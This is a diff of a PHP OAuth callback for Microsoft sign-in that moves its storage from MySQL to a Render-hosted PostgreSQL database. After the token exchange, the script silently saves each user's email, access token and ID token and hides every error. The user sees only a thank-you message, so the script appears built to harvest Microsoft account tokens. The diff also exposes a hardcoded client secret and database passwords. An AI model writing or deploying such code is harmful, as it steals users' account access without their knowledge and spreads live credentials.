@@ -5,11 +5,11 @@ $client_secret = 'de38Q~901_U0wQBpNYt5hhoNNJqBUs4CehuQFaiM';
 $redirect_uri = 'https://render-php-oauth.onrender.com/callback.php';
 $token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
 
-// --- DB (MySQLi) ---
-$db_host = 'YOUR_CPANEL_SERVER_IP_OR_HOST'; // NOT localhost
-$db_name = 'bearco79_oauth-db';
-$db_user = 'bearco79_oauth-user';
-$db_pass = 'Loverainbow5@';
+// --- DB (Render PostgreSQL) ---
+$db_host = 'dpg-d5vv58soud1c738tk8sg-a.virginia-postgres.render.com';
+$db_name = 'oauth_db_xiqr';
+$db_user = 'oauth_db_xiqr_user';
+$db_pass = 'm9MGFrvs6EbuxQACEDh9HWy43KCaKlsV';
 
 // --- START ---
 if (!isset($_GET['code'])) {
@@ -54,26 +54,15 @@ $payload = json_decode(
 $oid   = $payload['oid'] ?? null;
 $email = $payload['preferred_username'] ?? null;
 
-// Store silently (do not break page if DB fails)
-$mysqli = @new mysqli($db_host, $db_user, $db_pass, $db_name);
-if (!$mysqli->connect_error) {
-    $stmt = $mysqli->prepare(
-        "INSERT INTO oauth_users (oid, email, access_token, id_token)
-         VALUES (?, ?, ?, ?)"
-    );
-    if ($stmt) {
-        $stmt->bind_param(
-            "ssss",
-            $oid,
-            $email,
-            $token['access_token'],
-            $token['id_token']
-        );
-        $stmt->execute();
-        $stmt->close();
-    }
-    $mysqli->close();
+// Store silently in PostgreSQL
+try {
+    $pdo = new PDO("pgsql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $stmt = $pdo->prepare("INSERT INTO oauth_users (oid, email, access_token, id_token) VALUES (?, ?, ?, ?)");
+    $stmt->execute([$oid, $email, $token['access_token'], $token['id_token']]);
+} catch (PDOException $e) {
+    // silently fail, do not show to user
 }
 
-// User sees ONLY this
+// User sees only this
 echo "<h2>Thank you! You may now close this page.</h2>";
